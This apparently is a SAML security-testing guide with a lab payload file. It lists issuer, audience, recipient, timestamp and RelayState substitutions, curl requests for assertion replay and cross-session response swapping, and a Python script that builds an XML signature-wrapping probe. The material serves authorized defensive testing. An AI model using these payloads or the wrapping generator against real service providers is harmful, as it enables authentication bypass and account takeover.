blocks.text: SAML implementation flaws arise when a service provider consumes an assertion that was not correctly signed, bound to its request, intended for its audience, or still valid. XML structure and signature verification must refer to the same assertion.

items: XML signature wrapping and duplicate ID handling
Issuer, audience, destination and recipient validation
Assertion replay, expiry and authentication context

blocks.text: Use a local identity provider, a service provider and two test identities. Capture a valid response as the positive control. Change one field at a time. Structural or signature mutations should fail verification; use the trusted lab identity provider to re-sign claim mutations when testing downstream claim validation. XML fragments in the payload file replace matching elements in that captured response; they are not complete signed assertions. Base64-encode the complete XML for HTTP-POST binding and URL-encode form values. Redirect binding additionally requires the correct binding-specific compression and signature handling.

For wrapping tests, verify that the application consumes the same assertion that the signature verified. A parse error, a login page or an HTTP 200 alone proves no bypass. Record the resulting test identity and rejection reason. Replay a captured test assertion twice within its validity window and verify single-use enforcement where required. Never reuse real users' assertions.

See `saml-vulnerabilities-payloads.txt` for element replacements and bounded request sequences. Replace lab URLs, timestamps and IDs with values from the fixture. Unsigned examples are negative controls, not signature bypasses.

sections.label: Audience replacements: reject a different service provider or a lookalike identifier
Destination / recipient attribute substitutions in the captured Response or SubjectConfirmationData
Request binding: reject an unknown request ID; absent binding is policy-dependent for IdP-initiated SSO
Time validation: fixed historical / future negative controls; adjust the baseline to current lab time
KeyInfo fragment is a placeholder; substitute a complete test certificate, never a private key.
RelayState form fields: validate allowed local destinations independently of assertion validity
Assertion replay: run twice unchanged with a captured lab response
Cross-session response swap: use browser B's test cookie and browser A's response
Wrapping generator: lxml, captured signed response in saml-response.xml; writes test XML only
Confirm retained signature validity in the lab; wrapping behavior depends on XML canonicalization.

files.content:
# SAML Vulnerability Testing Payloads
# Authorized lab fixtures only. These are XML element/attribute replacements, not signed tokens.
# Claim-validation tests require re-signing with a trusted lab IdP; signature tampering is a separate control.

# Unsigned assertion negative control
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_saml_unsigned_probe" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><saml:Issuer>https://idp.example.test/metadata</saml:Issuer><saml:Subject><saml:NameID>saml-user-b@example.test</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData Recipient="https://sp.example.test/acs" InResponseTo="_saml_request_a" NotOnOrAfter="2099-01-01T00:00:00Z"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"><saml:AudienceRestriction><saml:Audience>https://sp.example.test/entity</saml:Audience></saml:AudienceRestriction></saml:Conditions></saml:Assertion>

# Issuer substitutions
<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://untrusted-idp.example.test/metadata</saml:Issuer>
<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"></saml:Issuer>

# Audience replacements: reject a different service provider or a lookalike identifier
<saml:Audience xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://other-sp.example.test/entity</saml:Audience>
<saml:Audience xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://sp.example.test.entity.untrusted.test/</saml:Audience>

# Destination / recipient attribute substitutions in the captured Response or SubjectConfirmationData
Destination="https://other-sp.example.test/acs"
Destination="https://sp.example.test/acs/extra"
Recipient="https://other-sp.example.test/acs"
Recipient="http://sp.example.test/acs"

# Request binding: reject an unknown request ID; absent binding is policy-dependent for IdP-initiated SSO
InResponseTo="_saml_unknown_request"
InResponseTo="_saml_other_browser_request"

# Time validation: fixed historical / future negative controls; adjust the baseline to current lab time
NotOnOrAfter="2000-01-01T00:00:00Z"
NotBefore="2099-01-01T00:00:00Z"
SessionNotOnOrAfter="2000-01-01T00:00:00Z"

<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">saml-user-b@example.test</saml:NameID>
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">saml-user-b-persistent</saml:NameID>

# KeyInfo fragment is a placeholder; substitute a complete test certificate, never a private key.
<ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:X509Data><ds:X509Certificate>LAB_UNTRUSTED_CERTIFICATE_BASE64</ds:X509Certificate></ds:X509Data></ds:KeyInfo>

URI="#saml_nonexistent_assertion"
URI=""
URI="https://untrusted-idp.example.test/assertion.xml"

# Authentication context / confirmation method replacements
<saml:AuthnContextClassRef xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
Method="urn:oasis:names:tc:SAML:2.0:cm:sender-vouches"

# RelayState form fields: validate allowed local destinations independently of assertion validity
RelayState=https%3A%2F%2Funtrusted.example.test%2Fsaml-return
RelayState=%2F%2Funtrusted.example.test%2Fsaml-return
RelayState=%2Faccount%2Fsaml-review

# Assertion replay: run twice unchanged with a captured lab response
curl -sS 'https://sp.example.test/acs' --data-urlencode 'SAMLResponse=LAB_CAPTURED_RESPONSE_BASE64' --data-urlencode 'RelayState=saml-replay-test'

# Cross-session response swap: use browser B's test cookie and browser A's response
curl -sS 'https://sp.example.test/acs' -H 'Cookie: saml_lab=LAB_BROWSER_B_SESSION' --data-urlencode 'SAMLResponse=LAB_BROWSER_A_RESPONSE_BASE64'

# Wrapping generator: lxml, captured signed response in saml-response.xml; writes test XML only
from copy import deepcopy
from lxml import etree
saml_parser = etree.XMLParser(resolve_entities=False, no_network=True)
saml_tree = etree.parse('saml-response.xml', saml_parser)
saml_root = saml_tree.getroot()
saml_ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds': 'http://www.w3.org/2000/09/xmldsig#'}
saml_signed = saml_root.find('saml:Assertion', saml_ns)
saml_unsigned = deepcopy(saml_signed)
for saml_signature in saml_unsigned.findall('ds:Signature', saml_ns):
    saml_unsigned.remove(saml_signature)
saml_unsigned.set('ID', '_saml_unsigned_wrapped')
saml_unsigned.find('saml:Subject/saml:NameID', saml_ns).text = 'saml-user-b@example.test'
saml_root.insert(0, saml_unsigned)
saml_tree.write('saml-wrapping-probe.xml', encoding='UTF-8', xml_declaration=True)
# Confirm retained signature validity in the lab; wrapping behavior depends on XML canonicalization.
